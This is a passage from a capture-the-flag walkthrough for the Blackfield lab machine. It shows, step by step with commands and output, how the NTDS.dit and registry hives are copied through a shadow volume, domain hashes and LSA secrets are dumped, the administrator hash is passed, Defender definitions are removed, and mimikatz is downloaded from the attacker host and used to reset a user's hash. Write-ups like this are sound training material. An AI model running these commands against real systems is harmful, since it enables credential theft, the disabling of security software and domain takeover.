support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::

[...]
```

`impacket-secretsdump -ntds ./NTDS.dit -system ./SYSTEM.hive LOCAL -history -user-status -pwd-last-set`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ./NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: (pwdLastSet=2020-02-23 19:09) (status=Enabled) ←
Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:7f1e4ff8c6a8e6b6fcae2d9c0572cd62:::
Administrator_history1:500:aad3b435b51404eeaad3b435b51404ee:ac2983b6afa7bdea9360fa7a95e31855:::
Administrator_history2:500:aad3b435b51404eeaad3b435b51404ee:a47feb765cf90d3216423e9cfedea565:::
Administrator_history3:500:aad3b435b51404eeaad3b435b51404ee:24958cffdd2aa3125c63c3fd374db44b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet=2020-06-03 18:18) (status=Enabled)
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:099990cea9e2234f0340fb57d2705492::: (pwdLastSet=2024-11-12 21:08) (status=Enabled)
DC01$_history0:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
DC01$_history1:1000:aad3b435b51404eeaad3b435b51404ee:2a2f8ac26db968c93a17fefdb36c38ee:::
DC01$_history2:1000:aad3b435b51404eeaad3b435b51404ee:3774928fe55833e6c62abdc233f47a7b:::
DC01$_history3:1000:aad3b435b51404eeaad3b435b51404ee:f4a13e41e3ae7a47a76323a4c6ef8e33:::
DC01$_history4:1000:aad3b435b51404eeaad3b435b51404ee:9e3d10cc537937888adcc0d918813a24:::
DC01$_history5:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
DC01$_history6:1000:aad3b435b51404eeaad3b435b51404ee:21cb362b80c113a49f39943f3c2cb5e1:::
DC01$_history7:1000:aad3b435b51404eeaad3b435b51404ee:e790ef736c276cc03a143bccd7d10ad4:::
DC01$_history8:1000:aad3b435b51404eeaad3b435b51404ee:8b3d254201af8899b2648b43a66ba3e4:::
DC01$_history9:1000:aad3b435b51404eeaad3b435b51404ee:b624dc83a27cc29da11d9bf25efea796:::
DC01$_history10:1000:aad3b435b51404eeaad3b435b51404ee:e8ef2d90a72603a5e3d17948665f4fa2:::
DC01$_history11:1000:aad3b435b51404eeaad3b435b51404ee:3c6028a9530a6f75da11f1aa69a9392b:::
DC01$_history12:1000:aad3b435b51404eeaad3b435b51404ee:3f335e65658b01c59a1b5a028cdf911b:::
DC01$_history13:1000:aad3b435b51404eeaad3b435b51404ee:4a576f3a479250d5ca5d5d568b963911:::
DC01$_history14:1000:aad3b435b51404eeaad3b435b51404ee:a880c96fb92f13dc3ac43041603ff2f4:::
DC01$_history15:1000:aad3b435b51404eeaad3b435b51404ee:657e9bcbcb9881f3046f46d6ea2c5368:::
DC01$_history16:1000:aad3b435b51404eeaad3b435b51404ee:a3dd9b235d409732386e410d869ae66c:::
DC01$_history17:1000:aad3b435b51404eeaad3b435b51404ee:d5217db598561daea001275a7b95f596:::
DC01$_history18:1000:aad3b435b51404eeaad3b435b51404ee:61aa6c112ae61a801f41d0751b50f681:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: (pwdLastSet=2020-02-23 19:08) (status=Disabled)
krbtgt_history0:502:aad3b435b51404eeaad3b435b51404ee:ac4e588741c6d7d6505dab2ab46e1ca8:::
krbtgt_history1:502:aad3b435b51404eeaad3b435b51404ee:00d92f0b41d329425102097d01f308cc:::
krbtgt_history2:502:aad3b435b51404eeaad3b435b51404ee:1968f16be5f9516357e895007068c944:::
krbtgt_history3:502:aad3b435b51404eeaad3b435b51404ee:1e18d532c339489708919207bb5d2d29:::
krbtgt_history4:502:aad3b435b51404eeaad3b435b51404ee:c63ade0c489e7e40bcaf7c11f3d8884d:::
krbtgt_history5:502:aad3b435b51404eeaad3b435b51404ee:2dd4d92918d5ad9f3f65d183508fcb42:::
krbtgt_history6:502:aad3b435b51404eeaad3b435b51404ee:a3c84c926b94b321c9d0a0bd471b025e:::
krbtgt_history7:502:aad3b435b51404eeaad3b435b51404ee:68a09bea08dfe60526d69540df48d066:::
krbtgt_history8:502:aad3b435b51404eeaad3b435b51404ee:b5ca59b606a13445af2043409d2c0086:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa::: (pwdLastSet=2020-09-22 00:35) (status=Enabled)
audit2020_history0:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5::: ←
audit2020_history1:1103:aad3b435b51404eeaad3b435b51404ee:c63407eac237a49a7e559f453cc6a4df:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::: (pwdLastSet=2020-02-23 18:53) (status=Enabled)
support_history0:1104:aad3b435b51404eeaad3b435b51404ee:eca3e06b52f76be986e4cd4a01c0db69:::
support_history1:1104:aad3b435b51404eeaad3b435b51404ee:7375cef738882d6c3a4592217951f491:::

[...]
```

<🔄 Alternative Step>

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

We start off by creating a file called `cmd` with the following content and place it in the `C:\Windows\temp\` folder.

`vim ./cmd`:
```
set context persistent nowriters
add volume c: alias temp
create
expose %temp% h:
exit
```

`unix2dos ./cmd`:
```
unix2dos: converting file ./cmd to DOS format...
```

`upload ./cmd`:
```
Info: Uploading /home/kali/cmd to C:\Users\svc_backup\Documents\cmd
                                        
Data: 116 bytes of 116 bytes copied
                                        
Info: Upload successful!
```

![Victim: svc_backup](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_backup-64b5f6?logo=windows11&logoColor=white)

We then execute it using `diskshadow /s cmd` to create a shadow volume accessible via the `H:` drive.

`cd C:\Users\svc_backup\AppData\Local\Temp`

`dir`:
```
    Directory: C:\Users\svc_backup\AppData\Local\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/13/2024   9:31 AM             92 cmd ←
-a----       11/13/2024   9:22 AM           1356 Dis2F86.tmp
-a----       11/13/2024   9:30 AM            258 Dis4399.tmp
-a----       11/13/2024   9:17 AM           1356 Dis570C.tmp
-a----       11/13/2024   9:18 AM           1356 Dis604E.tmp
-a----       11/13/2024   9:27 AM            258 Dis85B1.tmp
-a----       11/13/2024   9:31 AM           2332 DisC646.tmp
-a----       11/13/2024   9:25 AM            510 DisDB7C.tmp
-a----       11/13/2024   9:20 AM           1356 DisFF2.tmp
-a----       11/13/2024   9:31 AM           1172 Manifest.xml
```

`diskshadow /s cmd`:
```
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  11/13/2024 9:31:08 AM

-> SET CONTEXT PERSISTENT NOWRITERS
-> ADD VOLUME C: ALIAS TEMP
-> CREATE
Alias TEMP for shadow ID {01bf0d1d-b48a-4bff-a229-34f140ac4f2d} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {053130d6-827c-44a1-be75-dc44161264de} set as environment variable.

Querying all shadow copies with the shadow copy set ID {053130d6-827c-44a1-be75-dc44161264de}

        * Shadow copy ID = {01bf0d1d-b48a-4bff-a229-34f140ac4f2d}               %TEMP%
                - Shadow copy set: {053130d6-827c-44a1-be75-dc44161264de}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 11/13/2024 9:31:11 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> EXPOSE %TEMP% H:
-> %TEMP% = {01bf0d1d-b48a-4bff-a229-34f140ac4f2d}
The shadow copy was successfully exposed as H:\. ←
-> EXIT
```

`dir`:
```
    Directory: C:\Users\svc_backup\AppData\Local\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/13/2024   9:31 AM            631 2024-11-13_9-31-11_DC01.cab ←
-a----       11/13/2024   9:31 AM             92 cmd
-a----       11/13/2024   9:22 AM           1356 Dis2F86.tmp
-a----       11/13/2024   9:30 AM            258 Dis4399.tmp
-a----       11/13/2024   9:17 AM           1356 Dis570C.tmp
-a----       11/13/2024   9:18 AM           1356 Dis604E.tmp
-a----       11/13/2024   9:27 AM            258 Dis85B1.tmp
-a----       11/13/2024   9:31 AM           2332 DisC646.tmp
-a----       11/13/2024   9:25 AM            510 DisDB7C.tmp
-a----       11/13/2024   9:20 AM           1356 DisFF2.tmp
-a----       11/13/2024   9:31 AM           1172 Manifest.xml
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

Then, we upload `SeBackupPrivilegeUtils.dll` and `SeBackupPrivilegeCmdLets.dll` from the [`SeBackupPrivilege` GitHub repo](https://github.com/giuliano108/SeBackupPrivilege), which will allow us to copy files from the newly exposed shadow copy (`H:`).

`cd ./tools`

`git clone https://github.com/giuliano108/SeBackupPrivilege.git`:
```
Cloning into 'SeBackupPrivilege'...
remote: Enumerating objects: 28, done.
remote: Total 28 (delta 0), reused 0 (delta 0), pack-reused 28 (from 1)
Receiving objects: 100% (28/28), 15.28 KiB | 869.00 KiB/s, done.
Resolving deltas: 100% (8/8), done.
```

`upload ./tools/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll`:
```
Info: Uploading /home/kali/tools/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll to C:\Users\svc_backup\AppData\Local\Temp\SeBackupPrivilegeUtils.dll
                                        
Data: 21844 bytes of 21844 bytes copied
                                        
Info: Upload successful!
```

`upload ./tools/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll`:
```
Info: Uploading /home/kali/tools/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll to C:\Users\svc_backup\AppData\Local\Temp\SeBackupPrivilegeCmdLets.dll
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
```

![Victim: svc_backup](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_backup-64b5f6?logo=windows11&logoColor=white)

Next, import the `.dll` files and invoke the `Copy-FileSeBackupPrivilege` cmdlet on `NTDS.dit` and `SYSTEM`.

`import-module .\SeBackupPrivilegeCmdLets.dll`

`import-module .\SeBackupPrivilegeUtils.dll`

`Copy-FileSeBackupPrivilege H:\Windows\ntds\NTDS.dit C:\Windows\temp\NTDS.dit -Overwrite`

`Copy-FileSeBackupPrivilege H:\Windows\system32\config\SYSTEM C:\Windows\temp\SYSTEM -Overwrite`

`cd C:\\Windows\temp`

`dir NTDS.dit,SYSTEM`:
```
    Directory: C:\Windows\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/13/2024   9:39 AM       18874368 NTDS.dit ←
-a----       11/13/2024   9:40 AM       17825792 SYSTEM ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

Download the saved files with `Evil-WinRM`.

`download C://Windows/temp/NTDS.dit`:
```
Info: Downloading C://Windows/temp/NTDS.dit to NTDS.dit
                                        
Info: Download successful!
```

`download C://Windows/temp/SYSTEM`:
```
Info: Downloading C://Windows/temp/SYSTEM to SYSTEM
                                        
Info: Download successful!
```

Then run `secretsdump`, specifying the `LOCAL` parameter to extract the hashes from the `NTDS.dit`.

`file ./NTDS.dit ./SYSTEM`:
```
NTDS.dit:   Extensible storage engine DataBase, version 0x620, checksum 0xeb6f4d87, page size 8192, DirtyShutdown, Windows version 10.0
SYSTEM: MS Windows registry file, NT/2000 or above
```

`impacket-secretsdump -ntds ./NTDS.dit -system ./SYSTEM LOCAL`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ./NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: ←
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:39b03c058500e1f1d985af41c73ad769:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::

[...]
```

![Victim: svc_backup](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_backup-64b5f6?logo=windows11&logoColor=white)

If this wasn't a domain controller, there would be no `NTDS.dit` file to get passwords from, so we would need to download the `SYSTEM`, `SAM` and `SECURITY` files instead.

`Copy-FileSeBackupPrivilege H:\Windows\system32\config\SYSTEM c:\windows\temp\SYSTEM -Overwrite`

`Copy-FileSeBackupPrivilege H:\Windows\system32\config\SAM c:\windows\temp\SAM -Overwrite`

`Copy-FileSeBackupPrivilege H:\Windows\system32\config\SECURITY c:\windows\temp\SECURITY -Overwrite`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`download C://Windows/temp/SAM`:
```
Info: Downloading C://Windows/temp/SAM to SAM
                                        
Info: Download successful!
```

`download C://Windows/temp/SECURITY`:
```
Info: Downloading C://Windows/temp/SECURITY to SECURITY
                                        
Info: Download successful!
```

From these files we can extract LSA secrets, the machine account and local user hashes using `secretsdump`.

`impacket-secretsdump -system ./SYSTEM -sam ./SAM -security ./SECURITY LOCAL`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051::: ←
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:fe7398afe4ec70260caf50eff81d941bc74d74a15df09e8e83a016c624b340690db8ad532407b877f3779894fde78c6eb9fb03a3462ab4eb1a2c8d80e63dd5b73b1ec043d0e0b24b3ece261a8da301047aa087b33f9554e134dc43110cf623140c92249c7ea5ae780345a5770ae855c711950ba477a651ed9b30d7f916a7b70e0d4d347f2ba1bca85e96c5f6f03940f7d53fa2c9ebba01ee2792dcc28ab8df0822ac921d2a8ddae822638568428add567fe25712c032d0922513bb94d1c237f604e3fbdad50482c28001a012c6df937e5b18c7829c585c20014282d829494128d1af05ceefb0b127640fdab5fb33e670
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:39b03c058500e1f1d985af41c73ad769
[*] DefaultPassword 
(Unknown User):###_ADM1N_3920_###
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd4834e39bca0e657235935730c045b1b9934f690
dpapi_userkey:0x9fa187c3b866f3a77c651559633e2e120bc8ef6f
[*] NL$KM 
 0000   88 01 B2 05 DB 70 7A 0F  EF 52 DF 06 96 76 4C A4   .....pz..R...vL.
 0010   BD 6E 62 D1 06 63 1A 7E  31 2F A2 6D F8 6C 42 50   .nb..c.~1/.m.lBP
 0020   FC 8D 5C A4 FC 46 1B DC  7E CA 7E 76 7F 5E C2 74   ..\..F..~.~v.^.t
 0030   CF EB B6 1F 99 8A 29 CF  2C D1 1D 55 C6 01 2E 6F   ......).,..U...o
NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f
[*] Cleaning up...
```

</🔄 Alternative Step>

With the primary domain administrator hash, we can use `wmiexec` to get a shell (if we use `psexec`, the `Administrator` security context will not be preserved, and we will be `NT AUTHORITY SYSTEM`, which will not allow us to decrypt the file).

`netexec smb 10.10.10.192 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!) ←
```

`netexec smb 10.10.10.192 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee' --shares`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$          READ,WRITE      Remote Admin ←
SMB         10.10.10.192    445    DC01             C$              READ,WRITE      Default share
SMB         10.10.10.192    445    DC01             forensic        READ,WRITE      Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ,WRITE      Logon server share
```

`netexec smb 10.10.10.192 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee' -x 'whoami'`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
SMB         10.10.10.192    445    DC01             [+] Executed command via wmiexec
SMB         10.10.10.192    445    DC01             blackfield\administrator ←
```

`netexec winrm 10.10.10.192 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'`:
```
WINRM       10.10.10.192    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!) ←
```

`impacket-wmiexec 'administrator@10.10.10.192' -hashes ':184fb5e5178480be64824d4cd53b99ee'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
blackfield\administrator ←
```

`dir C:\Users\Administrator\Desktop`:
```
 Volume in drive C has no label.
 Volume Serial Number is 5BDD-68B4

 Directory of C:\Users\Administrator\Desktop

05/11/2020  20:38    <DIR>          .
05/11/2020  20:38    <DIR>          ..
28/02/2020  16:36               447 notes.txt
05/11/2020  20:38                32 root.txt ←
               2 File(s)            479 bytes
               2 Dir(s)   6,933,827,584 bytes free
```

`type C:\Users\Administrator\Desktop\root.txt`:
```
4375a*************************** 🚩
```

`cipher /c C:\Users\Administrator\Desktop\root.txt`:
```
 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows Vista/Server 2008

Access is denied. ←
Access is denied.
  Key information cannot be retrieved.

Access is denied.
```
❌

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`impacket-psexec 'administrator@10.10.10.192' -hashes ':184fb5e5178480be64824d4cd53b99ee'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.192.....
[*] Found writable share ADMIN$
[*] Uploading file YpUprCrP.exe
[*] Opening SVCManager on 10.10.10.192.....
[*] Creating service Efni on 10.10.10.192.....
[*] Starting service Efni.....
```
❌

`impacket-wmiexec 'administrator@10.10.10.192' -hashes ':184fb5e5178480be64824d4cd53b99ee'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)

`cd C:\Progra~1`

`dir`:
```
    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/19/2020  11:08 AM                Common Files
d-----        2/23/2020   6:32 AM                internet explorer
d-----        3/19/2020  11:08 AM                VMware
d-r---        2/28/2020   4:26 PM                Windows Defender ←
d-----        9/18/2020   6:29 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----        9/18/2020   6:29 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        9/18/2020   6:29 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----        9/15/2018  12:19 AM                WindowsPowerShell
```

`cd 'Windows Defender'`

`dir`:
```
    Directory: C:\Program Files\Windows Defender


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/28/2020   4:26 PM                en-US
d-----        9/15/2018  12:19 AM                Offline
d-----        2/23/2020   2:53 AM                platform
-a----        9/15/2018  12:13 AM           9398 AmMonitoringInstall.mof
-a----        9/15/2018  12:13 AM         197944 AMMonitoringProvider.dll
-a----        9/15/2018  12:13 AM          21004 AmStatusInstall.mof
-a----        9/15/2018  12:13 AM           2460 ClientWMIInstall.mof
-a----        9/15/2018  12:13 AM         310272 ConfigSecurityPolicy.exe
-a----        9/15/2018  12:13 AM         733184 EppManifest.dll
-a----        9/15/2018  12:13 AM            361 FepUnregister.mof
-a----        9/15/2018  12:13 AM          95248 MpAsDesc.dll
-a----        9/15/2018  12:13 AM        2428968 MpAzSubmit.dll
-a----        9/15/2018  12:13 AM         968232 MpClient.dll
-a----        9/15/2018  12:13 AM         470024 MpCmdRun.exe ←
-a----        9/15/2018  12:13 AM         349736 MpCommu.dll
-a----        2/28/2020   2:51 PM         128312 MpEvMsg.dll
-a----        9/15/2018  12:13 AM         129064 MpOAV.dll
-a----        9/15/2018  12:13 AM         187384 MpProvider.dll
-a----        9/15/2018  12:13 AM         657960 MpRtp.dll
-a----        9/15/2018  12:13 AM        2400808 MpSvc.dll
-a----        9/15/2018  12:13 AM          89104 MsMpCom.dll
-a----        9/15/2018  12:13 AM         110944 MsMpEng.exe
-a----        9/15/2018  12:13 AM          20008 MsMpLics.dll
-a----         9/6/2019   5:29 PM        3831576 NisSrv.exe
-a----        9/15/2018  12:13 AM         568832 ProtectionManagement.dll
-a----        9/15/2018  12:13 AM          64608 ProtectionManagement.mof
-a----        9/15/2018  12:13 AM           2570 ProtectionManagement_Uninstall.mof
-a----        9/15/2018  12:13 AM           1091 ThirdPartyNotices.txt
```

`./MpCmdRun.exe -RemoveDefinitions -All`:
```
Service Version: 4.18.2009.7
Engine Version: 1.1.17600.5
AntiSpyware Signature Version: 1.327.391.0
AntiVirus Signature Version: 1.327.391.0

Starting engine and signature rollback to none... ←
Done!
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`impacket-psexec 'administrator@10.10.10.192' -hashes ':184fb5e5178480be64824d4cd53b99ee'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.192.....
[*] Found writable share ADMIN$
[*] Uploading file gYTYUCJG.exe
[*] Opening SVCManager on 10.10.10.192.....
[*] Creating service taqI on 10.10.10.192.....
[*] Starting service taqI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1397]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system
```

`cd C:/Users/Administrator/Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is 5BDD-68B4

 Directory of C:\Users\Administrator\Desktop

11/05/2020  08:38 PM    <DIR>          .
11/05/2020  08:38 PM    <DIR>          ..
02/28/2020  04:36 PM               447 notes.txt
11/05/2020  08:38 PM                32 root.txt ←
               2 File(s)            479 bytes
               2 Dir(s)   7,275,274,240 bytes free
```

`type root.txt`:
```
Access is denied. ←
```
❌

`cipher /c root.txt`:
```
 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt: ←
    BLACKFIELD\Administrator [Administrator(Administrator@BLACKFIELD)] ←
    Certificate thumbprint: 327F 9775 6FF7 110B 0564 E159 7DBC AF6E 7D2A AFD8 

  Recovery Certificates:
    BLACKFIELD\Administrator [Administrator(Administrator@BLACKFIELD)]
    Certificate thumbprint: 78CD 0031 7A9C 948A 9A66 0D6D BC32 0706 D193 476A 

The specified file could not be decrypted.
  Key information cannot be retrieved.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i 'mimikatz.exe'`:
```
/home/kali/tools/mimikatz/Win32/mimikatz.exe
/home/kali/tools/mimikatz/x64/mimikatz.exe ←
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

`cp /home/kali/tools/mimikatz/x64/mimikatz.exe ./mimikatz.exe`

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`cd C:\`

`curl http://10.10.14.22/mimikatz.exe -o ./mimikatz.exe`:
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1220k  100 1220k    0     0   6250      0  0:03:20  0:03:20 --:--:--   752
```

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is 5BDD-68B4

 Directory of C:\

11/12/2024  02:38 PM         1,250,056 mimikatz.exe ←
02/28/2020  04:36 PM               447 notes.txt
05/26/2020  04:38 PM    <DIR>          PerfLogs
06/03/2020  08:47 AM    <DIR>          profiles
03/19/2020  10:08 AM    <DIR>          Program Files
02/01/2020  11:05 AM    <DIR>          Program Files (x86)
02/23/2020  09:16 AM    <DIR>          Users
11/12/2024  02:34 PM    <DIR>          Windows
               2 File(s)      1,250,503 bytes
               6 Dir(s)   7,282,552,832 bytes free
```

`.\mimikatz.exe "lsadump::setntlm /user:Audit2020 /ntlm:c95ac94a048e7c29ac4b4320d7c9d3b5"`:
```
 
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::setntlm /user:Audit2020 /ntlm:c95ac94a048e7c29ac4b4320d7c9d3b5
NTLM         : c95ac94a048e7c29ac4b4320d7c9d3b5 ←

Target server: 
Target user  : Audit2020 ←
Domain name  : BLACKFIELD
Domain SID   : S-1-5-21-4194615774-2175524697-3563712290
User RID     : 1103

>> Informations are in the target SAM!
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`netexec smb 10.10.10.192 -u 'audit2020' -H 'c95ac94a048e7c29ac4b4320d7c9d3b5'`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
